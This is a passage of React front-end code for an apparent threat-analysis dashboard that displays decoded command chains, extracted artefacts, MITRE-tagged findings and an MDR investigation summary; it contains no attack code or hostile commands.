               data-testid={`semantic-recovered-${chainIndex}`}>
            {semantic.recovered_script}
          </pre>
        </div>
      )}
      {ast.length > 0 && (
        <div>
          <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">
            AST · {ast.length} step(s)
          </div>
          <div className="space-y-1" data-testid={`semantic-ast-${chainIndex}`}>
            {ast.map((s, i) => (
              <div key={i} className="text-[11px] font-mono text-slate-200 flex items-baseline gap-2">
                <span className="text-slate-500">L{s.line_no + 1}</span>
                <span className="text-cyan-300 font-bold">{s.cmdlet}</span>
                {s.alias && (
                  <span className="text-[10px] text-slate-500">
                    (alias: <span className="text-violet-300">{s.alias}</span>)
                  </span>
                )}
                <span className="text-slate-400 truncate">
                  {(s.args || []).map(a => `"${a}"`).join(" ")}
                </span>
              </div>
            ))}
          </div>
        </div>
      )}
      {arts.length > 0 && (
        <div>
          <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">
            Extracted artefacts
          </div>
          <div className="flex flex-wrap gap-1">
            {arts.map((a, i) => (
              <span key={i}
                    title={a.evidence}
                    data-testid={`semantic-artifact-${chainIndex}-${i}`}
                    className={`px-2 py-0.5 rounded-full text-[10px] font-mono border ${
                      a.classification && CLS_TONE[a.classification] || "border-slate-700 text-slate-300"
                    }`}>
                <span className="text-slate-500">{a.kind}:</span> {a.value}
                {a.classification && (
                  <span className="ml-1 text-[9px] opacity-80">· {a.classification}</span>
                )}
              </span>
            ))}
          </div>
        </div>
      )}
      {behaviors.length > 0 && (
        <div>
          <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">
            Behaviors (evidence-weighted)
          </div>
          <div className="space-y-0.5">
            {behaviors.map((b, i) => (
              <div key={i} className="text-[11px] flex items-baseline gap-2"
                   data-testid={`semantic-behavior-${chainIndex}-${i}`}>
                <span className={`px-1.5 py-0.5 rounded text-[10px] font-mono font-bold border ${
                  b.weight >= 30 ? "border-red-500/60 text-red-200 bg-red-500/10"
                  : b.weight >= 15 ? "border-amber-500/60 text-amber-200 bg-amber-500/10"
                  : b.weight > 0 ? "border-sky-500/60 text-sky-200 bg-sky-500/10"
                  : "border-emerald-500/60 text-emerald-200 bg-emerald-500/10"
                }`}>
                  {b.category} +{b.weight}
                </span>
                <span className="text-slate-400 truncate">{b.evidence}</span>
                {(b.mitre || []).length > 0 && (
                  <span className="text-[10px] font-mono text-slate-500 ml-auto">
                    {b.mitre.join(" ")}
                  </span>
                )}
              </div>
            ))}
          </div>
        </div>
      )}
      {semantic.verdict_reason && (
        <div className="text-[11px] text-slate-300 pt-1 border-t border-slate-800">
          <span className="text-cyan-300 font-bold uppercase tracking-widest text-[10px]">Verdict rationale · </span>
          {semantic.verdict_reason}
        </div>
      )}
    </div>
  );
}

function ChainEnrichment({ enrichment, chainIndex }) {
  if (!enrichment) return null;
  const uas = enrichment.artefacts?.user_agents || [];
  const strings = enrichment.strings || [];
  const artefacts = enrichment.artefacts || {};
  const otherBuckets = Object.entries(artefacts).filter(
    ([k, v]) => k !== "user_agents" && Array.isArray(v) && v.length > 0);
  if (uas.length === 0 && strings.length === 0 && otherBuckets.length === 0) return null;
  return (
    <div className="border-t border-slate-800 bg-slate-950/40 p-3 space-y-2"
         data-testid={`chain-enrichment-${chainIndex}`}>
      <div className="text-[10px] tracking-[0.24em] font-bold text-emerald-300">
        RECOVERED PAYLOAD · ARTEFACTS
      </div>
      {uas.length > 0 && (
        <div data-testid={`chain-user-agents-${chainIndex}`}>
          <div className="text-[10px] uppercase tracking-widest text-violet-300 font-bold mb-1">User-Agent</div>
          <ul className="text-[11px] font-mono text-slate-100 space-y-0.5 break-all">
            {uas.map((ua, i) => (
              <li key={i} className="border-l-2 border-violet-500/50 pl-2">{ua}</li>
            ))}
          </ul>
        </div>
      )}
      {otherBuckets.length > 0 && (
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
          {otherBuckets.map(([k, vs]) => (
            <div key={k} className="border border-slate-800 rounded p-2 bg-slate-950/60">
              <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">
                {k.replace(/_/g, " ")} ({vs.length})
              </div>
              <ul className="text-[11px] font-mono text-slate-200 space-y-0.5 break-all">
                {vs.slice(0, 6).map((v, i) => <li key={i}>{v}</li>)}
                {vs.length > 6 && <li className="text-slate-500">…{vs.length - 6} more</li>}
              </ul>
            </div>
          ))}
        </div>
      )}
      {strings.length > 0 && (
        <div data-testid={`chain-strings-${chainIndex}`}>
          <div className="flex items-center justify-between mb-1">
            <div className="text-[10px] uppercase tracking-widest text-amber-300 font-bold">
              Extracted strings ({strings.length})
            </div>
            <div className="text-[10px] text-slate-500">click to expand · GNU strings-style</div>
          </div>
          <StringsList strings={strings} testid={`chain-strings-list-${chainIndex}`} initialCap={8} />
        </div>
      )}
    </div>
  );
}

function RecursiveStatsCard({ stats }) {
  if (!stats) return null;
  return (
    <section className="border border-cyan-500/40 rounded-xl p-4 bg-cyan-500/5"
             data-testid="recursive-stats">
      <div className="flex items-baseline justify-between mb-3">
        <div>
          <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300">
            RECURSIVE DECODE STATISTICS
          </div>
          <h3 className="text-lg font-bold text-slate-100">Layer breakdown</h3>
        </div>
        <span className={`px-3 py-1 rounded-full border text-[10px] font-bold uppercase tracking-widest ${
          stats.success_rate >= 90 ? "border-emerald-500/60 text-emerald-200 bg-emerald-500/10"
          : stats.success_rate >= 50 ? "border-amber-500/60 text-amber-200 bg-amber-500/10"
          : "border-red-500/60 text-red-200 bg-red-500/10"
        }`} data-testid="recursive-success-rate">
          {stats.success_rate}% success
        </span>
      </div>
      <div className="grid grid-cols-2 md:grid-cols-6 gap-2">
        <StatCell label="Commands" value={stats.commands_analysed} />
        <StatCell label="Total layers" value={stats.total_layers} />
        <StatCell label="Avg layers" value={stats.avg_layers} />
        <StatCell label="Max depth" value={stats.max_depth} />
        <StatCell label="Cache hits" value={stats.cache_hit_count} />
        <StatCell label="Layer time" value={`${stats.total_layer_ms}ms`} />
      </div>
      {(stats.top_decoders || []).length > 0 && (
        <div className="mt-3">
          <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1.5">Decoders used</div>
          <div className="flex flex-wrap gap-1.5" data-testid="recursive-top-decoders">
            {stats.top_decoders.map((d, i) => {
              const tone = decoderTone(d.decoder);
              return (
                <span key={i}
                      data-testid={`decoder-${d.decoder}`}
                      className={`px-2 py-1 rounded-full text-[10px] font-mono font-bold border ${tone.color} ${tone.border} ${tone.bg}`}>
                  {d.decoder} · <span className="text-slate-200">{d.count}</span>
                </span>
              );
            })}
          </div>
        </div>
      )}
    </section>
  );
}

function DecodeTreeSection({ chains, stats }) {
  if (!chains || chains.length === 0) return null;
  return (
    <section className="space-y-3" data-testid="decode-tree-section">
      <RecursiveStatsCard stats={stats} />
      <div>
        <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300 mb-2">
          RECURSIVE DECODE TREE · {chains.length} command chain(s)
        </div>
        <div className="space-y-2" data-testid="decode-tree-list">
          {chains.map((c, i) => <DecodeChainCard key={i} chain={c} />)}
        </div>
      </div>
    </section>
  );
}

// ─── Expandable Findings table (click-to-expand row) ──────────────
function FindingsTable({ findings }) {
  const [openIdx, setOpenIdx] = useState(null);
  return (
    <table className="w-full text-sm" data-testid="fis-findings-table">
      <thead className="text-slate-400 text-left border-b border-slate-800">
        <tr>
          <th className="py-2 w-6"></th>
          <th className="py-2">Command</th>
          <th className="py-2">Verdict</th>
          <th className="py-2 text-right">Risk</th>
          <th className="py-2">Why</th>
        </tr>
      </thead>
      <tbody>
        {findings.map((f, i) => {
          const open = openIdx === i;
          const cmdBody = (f.command_line || "").slice((f.binary || "").length);
          return (
            <React.Fragment key={i}>
              <tr
                  data-testid={`finding-row-${i}`}
                  onClick={() => setOpenIdx(open ? null : i)}
                  className="border-b border-slate-900 align-top cursor-pointer hover:bg-slate-800/40 transition-colors">
                <td className="py-2 font-mono text-slate-500 select-none">
                  {open ? "▼" : "▶"}
                </td>
                <td className="py-2 font-mono text-slate-200 max-w-[28ch] truncate" title={f.command_line}>
                  <span className="text-cyan-300 mr-1">{f.binary}</span>
                  {cmdBody.slice(0, 40)}{cmdBody.length > 40 ? "…" : ""}
                </td>
                <td className="py-2">
                  <span className={`px-2 py-0.5 rounded text-[10px] uppercase border ${VERDICT_TONE[f.verdict] || VERDICT_TONE.unknown}`}>
                    {f.verdict}
                  </span>
                </td>
                <td className="py-2 text-right font-mono text-slate-300">{f.risk_score ?? "—"}</td>
                <td className="py-2 text-slate-400 text-xs max-w-[48ch] truncate" title={f.why}>{f.why}</td>
              </tr>
              {open && (
                <tr data-testid={`finding-detail-${i}`}>
                  <td></td>
                  <td colSpan={4} className="pb-3">
                    <div className="border border-cyan-500/30 rounded-lg p-3 bg-slate-950/60 space-y-2">
                      <div>
                        <div className="text-[10px] uppercase tracking-widest text-cyan-300 font-bold mb-1">Full command</div>
                        <pre className="px-2 py-1.5 bg-slate-900/80 border border-slate-800 rounded text-[11px] font-mono text-slate-100 whitespace-pre-wrap break-all">{f.command_line || "—"}</pre>
                      </div>
                      {f.why && (
                        <div>
                          <div className="text-[10px] uppercase tracking-widest text-cyan-300 font-bold mb-1">Risk rationale</div>
                          <div className="text-xs text-slate-300 leading-relaxed">{f.why}</div>
                        </div>
                      )}
                      {(f.mitre_ids || []).length > 0 && (
                        <div>
                          <div className="text-[10px] uppercase tracking-widest text-cyan-300 font-bold mb-1">MITRE (per-command)</div>
                          <div className="flex flex-wrap gap-1">
                            {f.mitre_ids.map((m, mi) => (
                              <a key={mi}
                                 href={`https://attack.mitre.org/techniques/${m.split(".")[0]}/${m.includes(".") ? m.split(".")[1] + "/" : ""}`}
                                 target="_blank" rel="noreferrer"
                                 className="px-1.5 py-0.5 rounded text-[10px] font-mono border border-cyan-500/40 bg-cyan-500/10 text-cyan-200 hover:bg-cyan-500/20">
                                {m}
                              </a>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  </td>
                </tr>
              )}
            </React.Fragment>
          );
        })}
      </tbody>
    </table>
  );
}

// ─── Expandable strings list (click item = full text, "show all" toggle) ─
function StringsList({ strings, testid = "strings-list", initialCap = 10 }) {
  const [showAll, setShowAll] = useState(false);
  const [expanded, setExpanded] = useState(null);
  const visible = showAll ? strings : strings.slice(0, initialCap);
  return (
    <div data-testid={testid}>
      <div className="grid grid-cols-2 md:grid-cols-3 gap-x-3 gap-y-0.5 max-h-72 overflow-y-auto">
        {visible.map((s, i) => (
          <button key={i}
                  type="button"
                  data-testid={`${testid}-item-${i}`}
                  onClick={() => setExpanded(expanded === i ? null : i)}
                  className="text-left text-[11px] font-mono text-amber-100 truncate hover:text-amber-300 hover:underline transition-colors"
                  title={s}>
            {s}
          </button>
        ))}
      </div>
      {expanded !== null && (
        <div className="mt-2 border border-amber-500/40 rounded p-2 bg-amber-500/5"
             data-testid={`${testid}-expanded`}>
          <div className="flex items-baseline justify-between mb-1">
            <div className="text-[10px] uppercase tracking-widest text-amber-300 font-bold">
              String #{expanded + 1} · {visible[expanded].length} chars
            </div>
            <div className="flex items-center gap-2">
              <button type="button"
                      onClick={() => navigator.clipboard?.writeText(visible[expanded])}
                      className="text-[10px] text-cyan-300 hover:underline">copy</button>
              <button type="button"
                      onClick={() => setExpanded(null)}
                      className="text-[10px] text-slate-400 hover:underline">close</button>
            </div>
          </div>
          <pre className="text-[11px] font-mono text-amber-100 whitespace-pre-wrap break-all leading-snug">
            {visible[expanded]}
          </pre>
        </div>
      )}
      {strings.length > initialCap && (
        <button type="button"
                onClick={() => setShowAll(!showAll)}
                data-testid={`${testid}-toggle`}
                className="mt-2 text-[10px] uppercase tracking-widest text-cyan-300 hover:text-cyan-200 hover:underline font-bold">
          {showAll ? `↑ Show first ${initialCap}` : `↓ Show all ${strings.length}`}
        </button>
      )}
    </div>
  );
}


// ─── MDR INVESTIGATION · analyst-facing narrative ────────────────
const ESCAL_TONE = {
  escalate: "border-red-500/60 text-red-200 bg-red-500/10",
  monitor:  "border-amber-500/60 text-amber-200 bg-amber-500/10",
  close:    "border-emerald-500/60 text-emerald-200 bg-emerald-500/10",
};
const SEV_TONE = {
  critical: "border-red-500/60 text-red-200 bg-red-500/10",
  high:     "border-amber-500/60 text-amber-200 bg-amber-500/10",
  medium:   "border-sky-500/60 text-sky-200 bg-sky-500/10",
  low:      "border-slate-500/60 text-slate-200 bg-slate-500/10",
  informational: "border-emerald-500/60 text-emerald-200 bg-emerald-500/10",
};
const URL_CLS_TONE = {
  reference: "border-slate-600 text-slate-400 bg-slate-800/40",
  benign:    "border-emerald-500/40 text-emerald-200 bg-emerald-500/10",
  suspect:   "border-amber-500/60 text-amber-200 bg-amber-500/10",
  attacker:  "border-red-500/60 text-red-200 bg-red-500/10",
  unknown:   "border-slate-500 text-slate-300",
};

function MdrInvestigation({ mdr }) {
  const escal = mdr.escalation || {};
  const eTone = ESCAL_TONE[escal.decision] || ESCAL_TONE.monitor;
  const timeline = mdr.timeline || [];
  const recs = mdr.recommendations || [];
  const urlBuckets = mdr.url_classification || {};
  return (
    <section className="border border-cyan-500/40 rounded-xl p-5 bg-slate-950/70 space-y-4"
             data-testid="mdr-investigation">
      {/* Header */}
      <header className="flex flex-wrap items-baseline gap-3 border-b border-slate-800 pb-3">
        <div>
          <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300">
            MDR INVESTIGATION · TIER-2 ANALYST VIEW
          </div>
          <h2 className="text-xl font-bold text-slate-100">Executive Summary</h2>
        </div>
        <span className={`ml-auto px-3 py-1 rounded-full border text-[10px] uppercase tracking-widest font-bold ${eTone}`}
              data-testid="mdr-escalation-badge">
          {escal.decision || "monitor"} · {escal.confidence ?? 0}%
        </span>
      </header>
      {/* Narrative */}
      <div className="text-[13px] text-slate-100 leading-relaxed space-y-2 whitespace-pre-wrap"
           data-testid="mdr-executive-summary">
        {mdr.executive_summary}
      </div>
      {/* Metadata strip */}
      <div className="flex flex-wrap gap-4 text-[11px] border-t border-slate-800 pt-3">
        {(mdr.hosts || []).length > 0 && (
          <div><span className="text-slate-500 uppercase tracking-widest text-[10px]">Hosts: </span>
            <span className="font-mono text-cyan-200">{mdr.hosts.join(", ")}</span></div>
        )}
        {(mdr.users || []).length > 0 && (
          <div><span className="text-slate-500 uppercase tracking-widest text-[10px]">Users: </span>
            <span className="font-mono text-violet-200">{mdr.users.join(", ")}</span></div>
        )}
        {(mdr.sources || []).length > 0 && (
          <div><span className="text-slate-500 uppercase tracking-widest text-[10px]">Sources: </span>
            <span className="text-slate-200">{mdr.sources.join(" · ")}</span></div>
        )}
      </div>
      {/* Timeline */}
      {timeline.length > 0 && (
        <div>
          <div className="text-[10px] uppercase tracking-widest text-cyan-300 font-bold mb-2">
            Timeline Reconstruction · {timeline.length} event(s)
          </div>
          <ol className="space-y-2 border-l-2 border-cyan-500/40 pl-4" data-testid="mdr-timeline">
            {timeline.map((t, i) => (
              <li key={i} className="relative" data-testid={`mdr-timeline-${i}`}>
                <span className="absolute -left-[22px] top-1 w-3 h-3 rounded-full bg-cyan-500 border-2 border-slate-950" />
                <div className="text-[11px] font-mono text-cyan-300">{t.ts}</div>
                <div className="text-xs text-slate-200"
                     dangerouslySetInnerHTML={{__html: t.summary
                        .replace(/\*\*(.+?)\*\*/g, '<strong class="text-slate-100">$1</strong>')
                        .replace(/`([^`]+)`/g, '<code class="text-emerald-200 font-mono">$1</code>')}} />
              </li>
            ))}
          </ol>
        </div>
      )}
      {/* URL Classification */}
      {Object.values(urlBuckets).some(b => b.length > 0) && (
        <div>
          <div className="text-[10px] uppercase tracking-widest text-cyan-300 font-bold mb-2">
            URL Classification (reference URLs are never treated as IOCs)
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-2" data-testid="mdr-url-classification">
            {["attacker", "suspect", "unknown", "reference", "benign"].map(cls => {
              const bucket = urlBuckets[cls] || [];
              if (bucket.length === 0) return null;
              return (
                <div key={cls} className={`border rounded p-2 ${URL_CLS_TONE[cls]}`}>
                  <div className="text-[10px] uppercase tracking-widest font-bold mb-1">
                    {cls} · {bucket.length}
                  </div>
                  <ul className="text-[11px] font-mono space-y-0.5 break-all">
                    {bucket.slice(0, 5).map((u, i) => (
                      <li key={i} title={u.reason}>{u.url}</li>
                    ))}
                    {bucket.length > 5 && <li className="opacity-60">…{bucket.length - 5} more</li>}
                  </ul>
                </div>
              );
            })}
          </div>
        </div>
      )}
      {/* Recommendations */}
      {recs.length > 0 && (
        <div>
          <div className="text-[10px] uppercase tracking-widest text-cyan-300 font-bold mb-2">
            Analyst Recommendations
          </div>
          <div className="space-y-2" data-testid="mdr-recommendations">
            {recs.map((r, i) => (
              <div key={i} className={`border rounded p-2.5 ${SEV_TONE[r.severity] || SEV_TONE.medium}`}
                   data-testid={`mdr-rec-${i}`}>
                <div className="flex items-baseline gap-2">
                  <span className="text-[10px] uppercase tracking-widest font-bold">
                    {r.severity}
                  </span>
                  <span className="text-sm font-bold text-slate-100">{r.title}</span>
                </div>
                <div className="text-xs text-slate-300 mt-1">{r.why}</div>
              </div>
            ))}
          </div>
        </div>
      )}
      {/* Escalation rationale */}
      {escal.reason && (
        <div className="border-t border-slate-800 pt-3 text-xs text-slate-300">
          <span className="text-cyan-300 uppercase tracking-widest text-[10px] font-bold">Escalation rationale · </span>
          {escal.reason}
        </div>
      )}
    </section>
  );
}

